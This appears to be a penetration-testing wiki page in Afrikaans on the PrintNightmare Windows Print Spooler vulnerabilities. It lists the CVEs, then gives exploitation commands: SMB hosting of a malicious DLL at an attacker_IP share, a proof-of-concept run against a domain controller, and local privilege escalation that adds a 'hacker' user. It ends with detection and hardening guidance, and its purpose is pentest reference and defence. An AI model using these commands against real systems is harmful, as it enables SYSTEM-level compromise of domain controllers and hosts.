# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare is die kollektiewe naam wat gegee word aan 'n familie van kwesbaarhede in die Windows **Print Spooler** diens wat **arbitraire kode-uitvoering as SYSTEM** toelaat en, wanneer die spooler oor RPC bereikbaar is, **afgeleë kode-uitvoering (RCE) op domeinbeheerders en lêerbedieners**. Die mees wydgebruikte CVE's is **CVE-2021-1675** (aanvanklik geklassifiseer as LPE) en **CVE-2021-34527** (volledige RCE). Volgende probleme soos **CVE-2021-34481 (“Point & Print”)** en **CVE-2022-21999 (“SpoolFool”)** bewys dat die aanvaloppervlak steeds ver van gesluit is.

---

## 1. Kwesbare komponente & CVE's

| Jaar | CVE | Kort naam | Primitive | Aantekeninge |
|------|-----|-----------|-----------|--------------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Gepatch in Junie 2021 CU maar omseil deur CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx laat geverifieerde gebruikers toe om 'n stuurprogram DLL van 'n afgeleë deel te laai|
|2021|CVE-2021-34481|“Point & Print”|LPE|Ongesigneerde stuurprograminstallasie deur nie-admin gebruikers|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitraire gidscreatie → DLL plant – werk na 2021 patches|

Almal van hulle misbruik een van die **MS-RPRN / MS-PAR RPC metodes** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) of vertrou verhoudings binne **Point & Print**.

## 2. Exploitasiemetodes

### 2.1 Afgeleë Domeinbeheerder kompromie (CVE-2021-34527)

'n Geverifieerde maar **nie-bevoorregte** domein gebruiker kan arbitraire DLL's as **NT AUTHORITY\SYSTEM** op 'n afgeleë spooler (dikwels die DC) uitvoer deur:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Populêre PoCs sluit **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) en Benjamin Delpy se `misc::printnightmare / lsa::addsid` modules in **mimikatz** in.

### 2.2 Plaaslike voorregte-eskalasie (enige ondersteunde Windows, 2021-2024)

Die dieselfde API kan **lokaal** aangeroep word om 'n stuurprogram van `C:\Windows\System32\spool\drivers\x64\3\` te laai en SYSTEM voorregte te verkry:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – omseil 2021 regstellings

Microsoft se 2021 regstellings het afstands bestuurder laai geblokkeer, maar **het nie gids toestemming versterk nie**. SpoolFool misbruik die `SpoolDirectory` parameter om 'n arbitrêre gids te skep onder `C:\Windows\System32\spool\drivers\`, laat 'n payload DLL val, en dwing die spooler om dit te laai:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Die exploit werk op ten volle gepatchte Windows 7 → Windows 11 en Server 2012R2 → 2022 voor Februarie 2022 opdaterings

---

## 3. Opsporing & jag

* **Gebeurtenislogs** – stel die *Microsoft-Windows-PrintService/Operational* en *Admin* kanale in en kyk vir **Gebeurtenis ID 808** “Die drukspooler het gefaal om 'n plug-in module te laai” of vir **RpcAddPrinterDriverEx** boodskappe.
* **Sysmon** – `Gebeurtenis ID 7` (Beeld gelaai) of `11/23` (Lêer skryf/verwyder) binne `C:\Windows\System32\spool\drivers\*` wanneer die ouer proses **spoolsv.exe** is.
* **Proses afkoms** – waarskuwings wanneer **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell of enige ongetekende binêre genereer.

## 4. Versagting & verharding

1. **Patches!** – Pas die nuutste kumulatiewe opdatering toe op elke Windows-gasheer wat die Print Spooler diens geïnstalleer het.
2. **Deaktiveer die spooler waar dit nie benodig word nie**, veral op Domein Beheerders:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blokkeer afstandskonneksies** terwyl plaaslike drukwerk steeds toegelaat word – Groep Beleid: `Rekenaar Konfigurasie → Administratiewe Sjablone → Drukkers → Laat Print Spooler toe om kliëntverbindinge te aanvaar = Deaktiveer`.
4. **Beperk Punt & Druk** sodat slegs administrateurs bestuurders kan byvoeg deur die registerwaarde in te stel:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Gedetailleerde leiding in Microsoft KB5005652

---

## 5. Verwante navorsing / gereedskap

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool exploit & skrywe
* 0patch mikropatches vir SpoolFool en ander spooler foute

---

**Meer lees (buitelandse):** Kyk na die 2024 stap-vir-stap blogpos – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Verwysings

* Microsoft – *KB5005652: Bestuur nuwe Punt & Druk standaard bestuurder installasie gedrag*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
